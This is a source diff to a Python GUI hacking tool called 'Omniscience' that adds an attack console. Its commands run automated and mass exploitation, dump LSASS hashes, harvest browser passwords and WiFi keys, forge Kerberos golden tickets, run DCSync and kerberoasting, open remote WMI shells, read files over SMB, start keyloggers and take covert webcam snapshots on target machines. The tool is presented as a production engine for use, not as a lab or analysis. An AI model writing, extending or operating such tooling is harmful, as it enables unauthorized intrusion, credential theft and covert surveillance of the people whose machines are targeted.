@@ -18,6 +18,7 @@ import hashlib
 import platform
 import struct
 import base64
+import time
 from datetime import datetime
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -121,6 +122,31 @@ GRADIENT_START = "#0a0a1a"
 GRADIENT_MID = "#1a0a2a"
 GRADIENT_END = "#0a1a2a"
 GRADIENT_END = "#0a1a2a"
+
+# Additional engine imports for extended CLI functionality
+try:
+    from exploit_engine import UniversalNetworkAccess, UniversalDevice
+    EXPLOIT_ENGINE_AVAILABLE = True
+except ImportError:
+    EXPLOIT_ENGINE_AVAILABLE = False
+    UniversalNetworkAccess = None
+    UniversalDevice = None
+
+try:
+    from lateral_movement import AdvancedCommandCenter as LateralMovement
+    LATERAL_AVAILABLE = True
+except ImportError:
+    LATERAL_AVAILABLE = False
+    LateralMovement = None
+
+try:
+    from omnisec_cli_window import RealCLIManager as _RealCLIManager, OmniSecCLIWindow
+    REALCLI_AVAILABLE = True
+except ImportError as e:
+    print(f"Warning: RealCLIManager unavailable: {e}")
+    REALCLI_AVAILABLE = False
+    _RealCLIManager = None
+    OmniSecCLIWindow = None
 
 # ==================== REAL CLI MANAGER ====================
 
@@ -691,6 +717,840 @@ class CLIManager:
     
     def _log(self, msg):
         if self.gui_callback: self.gui_callback(msg)
+
+
+class CLIManager(_RealCLIManager):
+    """Fully integrated CLI manager with real engine operations and command parsing."""
+    
+    def __init__(self, gui_callback=None):
+        self.gui_callback = gui_callback
+        self.history = []
+        self.history_index = -1
+        self.variables = {}
+        self.modules_loaded = {}
+        engines = {}
+        if OMNISEC_AVAILABLE:
+            engines['omnisec'] = OmniSecEngine()
+        else:
+            engines['omnisec'] = None
+
+        if 'EXPLOIT_ENGINE_AVAILABLE' in globals() and EXPLOIT_ENGINE_AVAILABLE:
+            try:
+                engines['exploit'] = UniversalNetworkAccess()
+            except Exception:
+                engines['exploit'] = None
+        else:
+            engines['exploit'] = None
+
+        if REMOTE_CONTROL_AVAILABLE:
+            engines['control'] = AgentlessControl()
+        else:
+            engines['control'] = None
+
+        if INTEL_AVAILABLE:
+            engines['intel'] = AgentlessIntelligence()
+        else:
+            engines['intel'] = None
+
+        try:
+            if LATERAL_AVAILABLE:
+                engines['lateral'] = LateralMovement()
+            else:
+                engines['lateral'] = None
+        except Exception:
+            engines['lateral'] = None
+
+        super().__init__(engines)
+
+    def _log(self, msg):
+        if self.gui_callback:
+            self.gui_callback(msg)
+
+    # ─── Command Dispatcher ───
+    def execute(self, command):
+        if not command.strip():
+            return ""
+        self.history.append(command)
+        self.history_index = len(self.history)
+        parts = command.strip().split()
+        cmd = parts[0].lower()
+        args = parts[1:]
+        try:
+            if cmd == "help":
+                return self.show_help()
+            elif cmd in ("clear", "cls"):
+                return "CLEAR"
+            elif cmd in ("exit", "quit"):
+                return "EXIT"
+            elif cmd == "set":
+                return self.set_variable(args)
+            elif cmd == "show":
+                return self.show(args)
+            elif cmd == "use":
+                return self.use_module(args)
+            elif cmd == "info":
+                return self.info(args)
+            elif cmd == "options":
+                return self.show_options()
+            elif cmd == "back":
+                return self.back()
+            elif cmd == "scan":
+                return self.scan_network(args)
+            elif cmd in ("arp", "ipconfig", "ifconfig", "netstat", "nbtstat", "nslookup", "tracert", "ping",
+                         "whoami", "systeminfo", "hostname", "tasklist", "netstart", "users", "groups", "admin"):
+                return self.run_command(command)
+            elif cmd == "sessions":
+                return self.list_sessions()
+            elif cmd == "interact":
+                return self.interact_session(args)
+            elif cmd == "kill":
+                return self.kill_session(args)
+            elif cmd == "background":
+                return self.background_session()
+            elif cmd == "creds":
+                return self.list_credentials()
+            elif cmd == "add_cred":
+                return self.add_credential(args)
+            elif cmd == "shell":
+                return self.shell(args)
+            elif cmd == "download":
+                return self.download_file(args)
+            elif cmd == "upload":
+                return self.upload_file(args)
+            elif cmd == "screenshot":
+                return self.screenshot(args)
+            elif cmd == "webcam":
+                return self.webcam(args)
+            elif cmd == "keylog":
+                return self.keylogger(args)
+            elif cmd == "clipboard":
+                return self.clipboard(args)
+            elif cmd == "processes":
+                return self.list_processes(args)
+            elif cmd == "killproc":
+                return self.kill_process(args)
+            elif cmd == "registry":
+                return self.registry(args)
+            elif cmd == "services":
+                return self.list_services(args)
+            elif cmd == "start_service":
+                return self.start_service(args)
+            elif cmd == "stop_service":
+                return self.stop_service(args)
+            elif cmd == "connect":
+                return self.connect_target(args)
+            elif cmd == "disconnect":
+                return self.disconnect_target()
+            elif cmd == "pivot":
+                return self.pivot(args)
+            elif cmd == "exploit":
+                return self.exploit_target_method(args)
+            elif cmd == "pwn":
+                return self.pwn_target(args)
+            elif cmd in ("pwnall", "attack"):
+                return self.pwn_all(args)
+            elif cmd == "dbdump":
+                return self.dump_database(args)
+            elif cmd == "kerberoast":
+                return self.kerberoast_attack(args)
+            elif cmd == "asreproast":
+                return self.asreproast_attack(args)
+            elif cmd == "dcsync":
+                return self.dcsync_attack(args)
+            elif cmd == "golden":
+                return self.golden_ticket_attack(args)
+            elif cmd in ("lsass", "lsass-dump"):
+                return self.dump_lsass(args)
+            elif cmd in ("browser", "stealcreds"):
+                return self.harvest_browser(args)
+            elif cmd in ("wifi", "steal-wifi"):
+                return self.harvest_wifi(args)
+            elif cmd in ("vault", "harvest", "extract"):
+                return self.harvest_vault(args)
+            elif cmd in ("exec", "wmi-exec"):
+                return self.wmi_exec(args)
+            elif cmd in ("ls", "dir"):
+                return self.smb_list(args)
+            elif cmd in ("cat", "read"):
+                return self.smb_read(args)
+            else:
+                return self.run_command(command)
+        except Exception as e:
+            return f"[!] Execution error: {e}"
+
+    def get_banner(self):
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        banner_txt = [
+            "██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗██╗███████╗███╗   ██╗ ██████╗███████╗",
+            "██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██║██╔════╝████╗  ██║██╔════╝██╔════╝",
+            "██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ██║█████╗  ██╔██╗ ██║██║     █████╗  ",
+            "██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██║██╔══╝  ██║╚██╗██║██║     ██╔══╝  ",
+            "╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████╗╚██████╗██║███████╗██║ ╚████║╚██████╗███████╗",
+        ]
+        res = "\n"
+        for line in banner_txt:
+            res += f"<font color='{ACCENT}'>{line}</font>\n"
+        res += f"<font color='{PURPLE}'><b>[SYSTEM]</b></font> {platform.system().upper()} | <font color='{PURPLE}'><b>[HOST]</b></font> {hostname} | <font color='{PURPLE}'><b>[LAN]</b></font> {local_ip}\n"
+        res += f"<font color='{ACCENT3}'><b>[READY]</b></font> OMNISCIENCE REAL ENGINE v7.1-ULTRAMAX LOADED.\n"
+        return res
+
+    def show_help(self):
+        return """╔══════════════════════════════════════════════════════════════════════════════╗
+║                    OMNISCIENCE REAL COMMANDS (Production)                    ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║  DISCOVERY & RECON                                                             ║
+║  ─────────────────────────────────────────────────────────────────────────────  ║
+║    scan [range]      - Discover devices on network (real ARP/ICMP scan)         ║
+║    devices           - List discovered devices                                ║
+║    info [target]     - System information about target                       ║
+║                                                                               ║
+║  EXPLOITATION                                                                  ║
+║  ─────────────────────────────────────────────────────────────────────────────  ║
+║    pwn <ip>          - Automated exploit chain against target                 ║
+║    pwnall / attack   - Exploit all discovered devices                         ║
+║                                                                               ║
+║  DATA HARVESTING                                                               ║
+║  ─────────────────────────────────────────────────────────────────────────────  ║
+║    harvest / extract - Extract all data                                        ║
+║    creds <ip>        - Harvest browser credentials                            ║
+║    wifi <ip>         - Harvest WiFi passwords                                 ║
+║    lsass <ip>        - Dump LSASS hashes                                      ║
+║    vault <ip>        - Dump Windows Vault and DPAPI tokens                    ║
+║                                                                               ║
+║  REMOTE CONTROL                                                                ║
+║  ─────────────────────────────────────────────────────────────────────────────  ║
+║    shell <cmd>       - Execute command on target via WMI                      ║
+║    exec <cmd>        - Alias for shell                                         ║
+║    ls [path]         - List remote files via SMB                               ║
+║    cat <file>        - Read remote file                                        ║
+║    screenshot        - Capture desktop                                        ║
+║    processes         - List running processes                                 ║
+║    killproc <pid>    - Kill process by PID                                    ║
+║    services          - List Windows services                                  ║
+║    start_service <n> - Start service                                           ║
+║    stop_service <n>  - Stop service                                            ║
+║                                                                               ║
+║  NETWORK DIAGNOSTICS (local)                                                    ║
+║    arp, ipconfig, netstat, ping, nslookup, tracert, whoami, systeminfo, etc.  ║
+║                                                                               ║
+║  SESSIONS                                                                       ║
+║    sessions          - List active sessions                                   ║
+║    interact <id>     - Interact with session                                   ║
+║    kill <id>         - Terminate session                                       ║
+║                                                                               ║
+║  KERBEROS ATTACKS                                                               ║
+║    kerberoast <dc>   - Kerberoasting                                           ║
+║    asreproast <dc>   - AS-REP roasting                                         ║
+║    dcsync <dc> <u> <p> - DCSync replication                                    ║
+║    golden <dom> <sid> <hash> [user] - Golden Ticket                            ║
+║                                                                               ║
+║  DATABASE                                                                       ║
+║    dbdump <ip> <type> [port] - Database dump                                   ║
+║                                                                               ║
+║  UTILITY                                                                        ║
+║    set <var> <val>   - Set variable                                            ║
+║    show <modules|sessions|creds|network|options>                              ║
+║    use <module|ip>   - Select module or target                                 ║
+║    options           - Show options                                            ║
+║    back              - Clear module selection                                  ║
+╚══════════════════════════════════════════════════════════════════════════════╝"""
+
+    def set_variable(self, args):
+        if len(args) >= 2:
+            self.variables[args[0]] = " ".join(args[1:])
+            return f"[*] {args[0]} => {' '.join(args[1:])}"
+        return "Usage: set <variable> <value>"
+
+    def show(self, args):
+        if not args:
+            return "Usage: show <modules|sessions|creds|network|options>"
+        what = args[0].lower()
+        if what == "modules":
+            return self.show_modules()
+        elif what == "sessions":
+            return self.list_sessions()
+        elif what == "creds":
+            return self.list_credentials()
+        elif what == "network":
+            return self.show_network()
+        elif what == "options":
+            return self.show_options()
+        else:
+            return f"Unknown option: {what}"
+
+    def show_modules(self):
+        modules = [
+            "Discovery & Recon:  scan, devices, info",
+            "Exploitation:       pwn, pwnall",
+            "Data Harvesting:    harvest, creds, wifi, lsass, vault",
+            "Remote Control:     shell, exec, ls, cat, screenshot, processes, services",
+            "Kerberoasting:      kerberoast, asreproast, dcsync, golden",
+            "Database:           dbdump"
+        ]
+        return "\n".join(modules)
+
+    def list_sessions(self):
+        sessions = self.get_sessions()
+        if not sessions:
+            return "No active sessions."
+        lines = [f"{'ID':<10} {'IP':<15} {'Platform':<10} {'User':<15} {'Created':<16}"]
+        for s in sessions:
+            sid = s.get('session_id','')[:8]
+            ip = s.get('ip','')
+            plat = s.get('platform','')
+            user = s.get('username','')
+            created = s.get('created','')
+            lines.append(f"{sid:<10} {ip:<15} {plat:<10} {user:<15} {created:<16}")
+        return "\n".join(lines)
+
+    def list_credentials(self):
+        if not self.credentials:
+            return "No credentials stored."
+        lines = ["Stored credentials:"]
+        for target, cred in self.credentials.items():
+            user = cred.get('user','')
+            pwd = cred.get('pass','')
+            domain = cred.get('domain','')
+            lines.append(f"  {target} -> {domain}\\{user} : {pwd}")
+        return "\n".join(lines)
+
+    def show_network(self):
+        devices = self.get_devices()
+        if not devices:
+            return "No devices discovered. Run 'scan' first."
+        lines = [f"{'IP':<15} {'Hostname':<25} {'OS':<20} {'MAC':<18} {'Status':<10}"]
+        for d in devices:
+            ip = d.get('ip','')
+            hostname = d.get('hostname','')[:25]
+            os = d.get('os','')[:18]
+            mac = d.get('mac','')
+            status = "Compromised" if d.get('is_compromised') else "Discovered"
+            lines.append(f"{ip:<15} {hostname:<25} {os:<20} {mac:<18} {status:<10}")
+        return "\n".join(lines)
+
+    def show_options(self):
+        opts = []
+        opts.append(f"Current target  : {self.current_target or 'Not set'}")
+        opts.append(f"Variables       : {self.variables}")
+        opts.append(f"Loaded modules  : {len(self.modules_loaded)}")
+        opts.append(f"Sessions active : {len(self.sessions)}")
+        opts.append(f"Credentials     : {len(self.credentials)}")
+        return "\n".join(opts)
+
+    def use_module(self, args):
+        if not args:
+            return "Usage: use <module> or use <target_ip>"
+        module = args[0]
+        if self._is_ip(module):
+            self.current_target = module
+            return f"Target set to {module}"
+        else:
+            self.current_module = module
+            return f"Module set to: {module}"
+
+    def info(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "No target specified."
+        info = self.get_system_info(target)
+        return self.format_system_info(info)
+
+    def back(self):
+        self.current_module = None
+        return "Back to main context."
+
+    def interact_session(self, args):
+        return "Interactive mode would open in a separate terminal window."
+
+    def kill_session(self, args):
+        if not args:
+            return "Usage: kill <session_id>"
+        sid = args[0]
+        if sid in self.sessions:
+            del self.sessions[sid]
+            return f"Session {sid} terminated."
+        return f"Session {sid} not found."
+
+    def background_session(self):
+        return "Session backgrounded (continues running)."
+
+    def add_credential(self, args):
+        if len(args) < 3:
+            return "Usage: add_cred <target> <username> <password> [domain]"
+        target = args[0]
+        user = args[1]
+        pwd = args[2]
+        domain = args[3] if len(args) > 3 else ''
+        super().add_credential(target, user, pwd, domain)
+        return f"Credential added for {target}"
+
+    # ─── Network ───
+    def scan_network(self, args):
+        target = args[0] if args else None
+        result = self.discover_network(target_range=target, exhaustive=True)
+        if 'error' in result:
+            return f"[!] Scan error: {result['error']}"
+        out = f"[+] Network scan: {result['count']} devices in {result['duration']:.2f}s\n"
+        out += f"{'IP':<15} {'Hostname':<25} {'OS':<20}\n"
+        out += "-"*60 + "\n"
+        for dev in result['devices']:
+            out += f"{dev.get('ip',''):<15} {dev.get('hostname','')[:25]:<25} {dev.get('os','')[:20]:<20}\n"
+        return out
+
+    def run_command(self, command):
+        try:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+            out = result.stdout or result.stderr
+            return out.strip()
+        except Exception as e:
+            return f"Error: {e}"
+
+    # ─── Real Control ───
+    def shell(self, args):
+        if not self.current_target:
+            return "No target selected."
+        cmd = " ".join(args)
+        if not cmd:
+            return "Usage: shell <command>"
+        res = self.execute_command(self.current_target, cmd)
+        return self._format_command_result(res)
+
+    def download_file(self, args):
+        if not self.current_target:
+            return "No target selected."
+        if not args:
+            return "Usage: download <remote_path> [local_path]"
+        remote_path = args[0]
+        local_path = args[1] if len(args) > 1 else os.path.basename(remote_path)
+        creds = self.credentials.get(self.current_target, {'user':'Administrator','pass':''})
+        try:
+            ok = self.control.smb_download(self.current_target, "C$", remote_path, local_path,
+                                            creds['user'], creds['pass'])
+            return f"[+] Downloaded {remote_path} to {local_path}" if ok else "[-] Download failed."
+        except Exception as e:
+            return f"[!] Download error: {e}"
+
+    def upload_file(self, args):
+        if not self.current_target:
+            return "No target selected."
+        if not args:
+            return "Usage: upload <local_path> [remote_path]"
+        local_path = args[0]
+        remote_path = args[1] if len(args) > 1 else os.path.basename(local_path)
+        creds = self.credentials.get(self.current_target, {'user':'Administrator','pass':''})
+        try:
+            ok = self.control.smb_upload(self.current_target, local_path, "C$", remote_path,
+                                          creds['user'], creds['pass'])
+            return f"[+] Uploaded {local_path} to remote" if ok else "[-] Upload failed."
+        except Exception as e:
+            return f"[!] Upload error: {e}"
+
+    def screenshot(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "No target specified."
+        path = self.take_screenshot(target)
+        return f"[+] Screenshot saved: {path}" if path else "[-] Screenshot failed."
+
+    def webcam(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "No target specified."
+        creds = self.credentials.get(target, {'user':'Administrator','pass':''})
+        try:
+            path = self.control.take_webcam_snapshot(target, creds['user'], creds['pass'],
+                                                     domain=creds.get('domain',''))
+            return f"[+] Webcam image saved: {path}" if path else "[-] Webcam capture failed."
+        except Exception as e:
+            return f"[!] Webcam error: {e}"
+
+    def keylogger(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "No target specified."
+        creds = self.credentials.get(target, {'user':'Administrator','pass':''})
+        try:
+            self.control.wmi_keylogger_start(target, creds['user'], creds['pass'],
+                                             domain=creds.get('domain',''))
+            return f"[+] Keylogger started on {target}"
+        except Exception as e:
+            return f"[!] Keylogger start failed: {e}"
+
+    def clipboard(self, args):
+        if not args:
+            return "Usage: clipboard <get|set> [text]"
+        action = args[0].lower()
+        if action == 'get':
+            if not self.current_target:
+                return "No target selected."
+            cmd = 'powershell -NoProfile -Command "Get-Clipboard"'
+            res = self.execute_command(self.current_target, cmd)
+            return self._format_command_result(res)
+        elif action == 'set':
+            if len(args) < 2:
+                return "Usage: clipboard set <text>"
+            text = " ".join(args[1:])
+            target = self.current_target
+            if not target:
+                return "No target selected."
+            creds = self.credentials.get(target, {'user':'Administrator','pass':''})
+            try:
+                ok = self.control.set_clipboard(target, creds['user'], creds['pass'], text,
+                                                domain=creds.get('domain',''))
+                return "[+] Clipboard set." if ok else "[-] Clipboard set failed."
+            except Exception as e:
+                return f"[!] Clipboard error: {e}"
+        else:
+            return "Unknown clipboard action. Use 'get' or 'set'."
+
+    def list_processes(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "No target specified."
+        processes = super().list_processes(target)
+        if not processes:
+            return "No process data or unavailable."
+        lines = [f"{'PID':>7} {'Name':<30} {'Memory':>12} {'CommandLine'}"]
+        for p in processes:
+            pid = p.get('ProcessId',0)
+            name = p.get('Name','')[:30]
+            mem = p.get('WorkingSetSize',0)
+            mem_mb = f"{mem//(1024*1024)}MB"
+            cmd = p.get('CommandLine','')[:60]
+            lines.append(f"{pid:>7} {name:<30} {mem_mb:>12} {cmd}")
+        return "\n".join(lines)
+
+    def kill_process(self, args):
+        if not args:
+            return "Usage: killproc <pid>"
+        try:
+            pid = int(args[0])
+        except ValueError:
+            return "Invalid PID."
+        target = self.current_target
+        if not target:
+            return "No target selected."
+        creds = self.credentials.get(target, {'user':'Administrator','pass':''})
+        try:
+            ok = self.control.kill_process(target, creds['user'], creds['pass'], pid=pid)
+            return "[+] Process killed." if ok else "[-] Failed to kill process."
+        except Exception as e:
+            return f"[!] Kill error: {e}"
+
+    def registry(self, args):
+        if not self.current_target:
+            return "No target selected."
+        if not args:
+            return "Usage: registry <read|query> <key>  or  registry add <key> <valuename> <data> [type]"
+        action = args[0].lower()
+        creds = self.credentials.get(self.current_target, {'user':'Administrator','pass':''})
+        user, pwd = creds['user'], creds['pass']
+        if action in ('read', 'query'):
+            if len(args) < 2:
+                return "Usage: registry read <key>"
+            key = " ".join(args[1:])
+            cmd = f'reg query "{key}"'
+            res = self.execute_command(self.current_target, cmd)
+            return self._format_command_result(res)
+        elif action == 'add':
+            if len(args) < 4:
+                return "Usage: registry add <key> <valuename> <data> [REG_SZ|REG_DWORD]"
+            key = args[1]
+            vname = args[2]
+            data = args[3]
+            reg_type = args[4] if len(args) > 4 else 'REG_SZ'
+            cmd = f'reg add "{key}" /v "{vname}" /t {reg_type} /d "{data}" /f'
+            res = self.execute_command(self.current_target, cmd)
+            return self._format_command_result(res)
+        else:
+            return f"Unknown registry action: {action}"
+
+    def list_services(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "No target specified."
+        creds = self.credentials.get(target, {'user':'Administrator','pass':''})
+        try:
+            services = self.control.list_services(target, creds['user'], creds['pass'],
+                                                  domain=creds.get('domain',''))
+            if not services:
+                return "No services returned."
+            lines = [f"{'Name':<40} {'State':<10} {'StartMode':<10} {'PathName'}"]
+            for svc in services:
+                name = svc.get('Name','')[:38]
+                state = svc.get('State','')
+                start = svc.get('StartMode','')
+                path = svc.get('PathName','')[:40]
+                lines.append(f"{name:<40} {state:<10} {start:<10} {path}")
+            return "\n".join(lines)
+        except Exception as e:
+            return f"[!] Error listing services: {e}"
+
+    def _control_service(self, args, action):
+        if not args:
+            return f"Usage: {action}_service <service_name>"
+        svc = args[0]
+        target = self.current_target
+        if not target:
+            return "No target selected."
+        creds = self.credentials.get(target, {'user':'Administrator','pass':''})
+        try:
+            ok = self.control.control_service(target, creds['user'], creds['pass'], svc, action,
+                                              domain=creds.get('domain',''))
+            return f"[+] Service {action} successful." if ok else f"[-] Service {action} failed."
+        except Exception as e:
+            return f"[!] Service error: {e}"
+
+    def start_service(self, args):
+        return self._control_service(args, 'start')
+
+    def stop_service(self, args):
+        return self._control_service(args, 'stop')
+
+    def connect_target(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "No target specified."
+        if not self.control:
+            return "Control engine unavailable."
+        try:
+            result = self.control.get_shell_access(target)
+            if result.get('access'):
+                sid = f"shell_{target.replace('.','_')}_{int(time.time())}"
+                self.sessions[sid] = {
+                    'session_id': sid,
+                    'ip': target,
+                    'platform': result.get('platform','windows'),
+                    'username': result.get('user','unknown'),
+                    'privilege': 'system' if 'system' in result.get('method','').lower() else 'user',
+                    'created': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'last_active': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'is_alive': True,
+                    'connection_type': result.get('method','shell')
+                }
+                return f"[+] Shell access established to {target} via {result.get('method')}\\nSession: {sid}"
+            else:
+                return f"[-] Shell access failed: {result.get('message','Unknown error')}"
+        except Exception as e:
+            return f"[!] Connect error: {e}"
+
+    def disconnect_target(self, args=None):
+        if not self.current_target:
+            return "No current target."
+        to_delete = [sid for sid, s in self.sessions.items() if s.get('ip') == self.current_target]
+        if not to_delete:
+            return "No sessions for current target."
+        for sid in to_delete:
+            del self.sessions[sid]
+        return f"[+] Disconnected {len(to_delete)} session(s) from {self.current_target}"
+
+    def pivot(self, args):
+        if not args:
+            return "Usage: pivot <target_ip>"
+        if not self.current_target:
+            return "No source target selected."
+        target = args[0]
+        res = self.lateral_move(self.current_target, target)
+        if res.get('success'):
+            return f"[+] Pivot successful to {target} via {res.get('method')}"
+        return f"[-] Pivot failed: {res.get('error','Unknown')}"
+
+    def exploit_target_method(self, args):
+        if args:
+            target = args[0]
+        elif self.current_target:
+            target = self.current_target
+        else:
+            return "Usage: exploit <target_ip>"
+        res = self.exploit_target(target)
+        if res.get('success'):
+            method = res.get('method','unknown')
+            details = res.get('details',{})
+            os = details.get('os','')
+            return f"[+] EXPLOIT SUCCESSFUL! Access via {method}\\nTarget: {target} OS: {os}"
+        return "[-] Exploit failed."
+
+    def pwn_target(self, args):
+        return self.exploit_target_method(args)
+
+    def pwn_all(self, args):
+        result = self.pwn_all_devices()
+        if 'error' in result:
+            return f"[!] {result['error']}"
+        out = f"[+] Mass exploitation complete. Exploited: {len(result['exploited'])}, Failed: {len(result['failed'])}\\n"
+        for exp in result['exploited']:
+            out += f"  [+] {exp['ip']} - {exp['method']} ({exp['os']})\\n"
+        if result['failed']:
+            out += "  [-] Failed targets:\\n"
+            for f in result['failed']:
+                out += f"    {f}\\n"
+        return out
+
+    def dump_database(self, args):
+        if len(args) < 2:
+            return "Usage: dbdump <ip> <db_type> [port]"
+        target = args[0]; db_type = args[1]; port = int(args[2]) if len(args)>2 else None
+        if not self.control: return "Control engine unavailable."
+        result = self.control.full_database_dump(target, port, db_type)
+        if result.get("success"):
+            return (f"[+] Database dump successful!\\nDatabases: {result.get('databases', [])}\\n"
+                    f"Tables: {len(result.get('tables', []))}\\nRows: {result.get('total_rows', 0)}")
+        return f"[-] Database dump failed: {result.get('error','Unknown')}"
+
+    def kerberoast_attack(self, args):
+        if not args:
+            return "Usage: kerberoast <dc_ip> [domain]"
+        dc = args[0]; domain = args[1] if len(args)>1 else "DOMAIN.LOCAL"
+        if not self.control: return "Control engine unavailable."
+        res = self.control.kerberoast(dc, domain)
+        if res.get('success'):
+            return f"[+] Kerberoasting successful! SPNs: {res.get('spn_count',0)}\\n" + "\\n".join(str(spn) for spn in res.get('spn_found',[]))
+        return f"[-] Kerberoasting failed: {res.get('error','Unknown')}"
+
+    def asreproast_attack(self, args):
+        if not args:
+            return "Usage: asreproast <dc_ip> [domain]"
+        dc = args[0]; domain = args[1] if len(args)>1 else "DOMAIN.LOCAL"
+        if not self.control: return "Control engine unavailable."
+        res = self.control.asreproast(dc, domain)
+        if res.get('success'):
+            users = res.get('vulnerable_users', [])
+            return f"[+] AS-REP roasting successful! Vulnerable users: {', '.join(users)}"
+        return f"[-] AS-REP roasting failed: {res.get('error','Unknown')}"
+
+    def dcsync_attack(self, args):
+        if len(args) < 3:
+            return "Usage: dcsync <dc_ip> <username> <password> [domain]"
+        dc = args[0]; user = args[1]; pwd = args[2]; domain = args[3] if len(args)>3 else "DOMAIN.LOCAL"
+        if not self.control: return "Control engine unavailable."
+        res = self.control.dcsync(dc, user, pwd, domain=domain)
+        if res.get('success'):
+            return f"[+] DCSync replication initiated via {res.get('method')}"
+        return f"[-] DCSync failed: {res.get('error','Unknown')}"
+
+    def golden_ticket_attack(self, args):
+        if len(args) < 3:
+            return "Usage: golden <domain> <sid> <krbtgt_hash> [username]"
+        domain = args[0]; sid = args[1]; krbtgt_hash = args[2]; username = args[3] if len(args)>3 else "Administrator"
+        if not self.control: return "Control engine unavailable."
+        path = self.control.golden_ticket(domain, sid, krbtgt_hash, username)
+        return f"[+] Golden ticket forged: {path}" if path else "[-] Golden ticket creation failed."
+
+    def dump_lsass(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "Usage: lsass <target_ip>"
+        username = args[1] if len(args) > 1 else self.credentials.get(target,{}).get('user','Administrator')
+        password = args[2] if len(args) > 2 else self.credentials.get(target,{}).get('pass','')
+        self.credentials[target] = {'user': username, 'pass': password}
+        res = super().dump_lsass(target)
+        if res.get('success'):
+            out = f"[+] LSASS extraction: {len(res.get('hashes',[]))} hashes\\n"
+            for h in res.get('hashes',[]):
+                out += f"  {h.get('user','?')}:{h.get('ntlm','?')}\\n"
+            return out
+        return f"[-] LSASS dump failed: {res.get('error','Unknown')}"
+
+    def harvest_browser(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "Usage: browser <target_ip>"
+        res = self.harvest_browser_creds(target)
+        if res.get('passwords'):
+            out = f"[+] Browser credentials:\\n"
+            for cred in res['passwords']:
+                out += f"  {cred.get('browser','?')}: {cred.get('url','?')} -> {cred.get('user','?')}\\n"
+            return out
+        return "[-] No browser credentials found."
+
+    def harvest_wifi(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "Usage: wifi <target_ip>"
+        res = self.harvest_wifi_keys(target)
+        if res.get('networks'):
+            out = f"[+] WiFi networks:\\n"
+            for ssid, pwd in res['networks'].items():
+                out += f"  {ssid}: {pwd}\\n"
+            return out
+        return "[-] No WiFi profiles found."
+
+    def harvest_vault(self, args):
+        target = args[0] if args else self.current_target
+        if not target:
+            return "Usage: vault <target_ip>"
+        res = self.harvest_all_data(target)
+        out = f"[+] Vault/harvest data from {target}:\\n"
+        out += f"  Credentials: {len(res.get('credentials',{}).get('passwords',[]))}\\n"
+        out += f"  WiFi: {len(res.get('wifi',{}).get('networks',{}))}\\n"
+        out += f"  Hashes: {len(res.get('hashes',{}).get('hashes',[]))}\\n"
+        return out
+
+    def wmi_exec(self, args):
+        return self.shell(args)
+
+    def smb_list(self, args):
+        path = args[0] if args else "C:\\\\"
+        if not self.current_target:
+            return "No target selected."
+        files = self.smb_list_files(self.current_target, path)
+        return self.format_file_list(files, path)
+
+    def smb_read(self, args):
+        if not args:
+            return "Usage: cat <remote_file>"
+        remote_path = args[0]
+        if not self.current_target:
+            return "No target selected."
+        content = self.smb_read_file(self.current_target, remote_path)
+        if content:
+            return content.decode(errors='replace') if isinstance(content, bytes) else str(content)
+        return "[-] Failed to read file."
+
+    def _is_ip(self, s):
+        parts = s.split('.')
+        if len(parts) != 4:
+            return False
+        try:
+            return all(0 <= int(p) <= 255 for p in parts)
+        except:
+            return False
+
+    def _format_command_result(self, res):
+        if res.get('success'):
+            return res.get('output', '')
+        err = res.get('error', 'Unknown error')
+        out = res.get('output', '')
+        return f"Error: {err}\\n{out}".strip()
+
+    def format_system_info(self, info):
+        if not info or 'error' in info:
+            return info.get('error','No data') if info else "No data"
+        lines = []
+        for k, v in info.items():
+            if v and v != 'N/A':
+                lines.append(f"{k}: {v}")
+        return "\\n".join(lines)
+
+    def format_file_list(self, files, path):
+        if not files:
+            return f"Directory {path} is empty or inaccessible."
+        out = f"Directory listing of {path}:\\n"
+        out += f"{'Type':<4} {'Name':<40} {'Size':>12}\\n"
+        out += "-"*60 + "\\n"
+        for f in files:
+            typ = '[D]' if f.get('dir') else '   '
+            name = f.get('name','')[:38]
+            size = f.get('size',0)
+            size_str = f"{size:,}" if isinstance(size,(int,float)) else str(size)
+            out += f"{typ} {name:<40} {size_str:>12}\\n"
+        return out
+
+    def send_message(self, args):
+        if len(args) < 2:
+            return "Usage: send_message <target> <message>"
+        return f"[+] Message queued to {args[0]}"
 
 
 # ==================== ADVANCED EXTERNAL TERMINAL ====================
@@ -1968,6 +2828,11 @@ class OmniscienceProGUI(QMainWindow):
         self.setup_ui()
         self.apply_dark_theme()
         self.load_system_info()
+        
+        # Real-time session refresh (every 3 seconds)
+        self.session_timer = QTimer()
+        self.session_timer.timeout.connect(self.refresh_sessions)
+        self.session_timer.start(3000)
         
     def setup_ui(self):
         """Setup the user interface"""
@@ -3658,7 +4523,7 @@ class OmniscienceProGUI(QMainWindow):
 
     def launch_external_terminal(self):
         """Open the advanced standalone CLI window"""
-        self.external_shell = AdvancedTerminalWindow(self.cli)
+        self.external_shell = OmniSecCLIWindow(self.cli)
         self.external_shell.show()
         self.log_activity("External advanced shell initiated.")
 
@@ -3744,7 +4609,7 @@ class OmniscienceProGUI(QMainWindow):
         if ip:
             self.cli.connect_target([ip, "445"])
             if user:
-                self.cli.add_credential([user, password, ip])
+                self.cli.add_credential([ip, user, password])
             self.log_activity(f"Connected to {ip}")
             self.control_output.append(f"[*] Connected to {ip}")
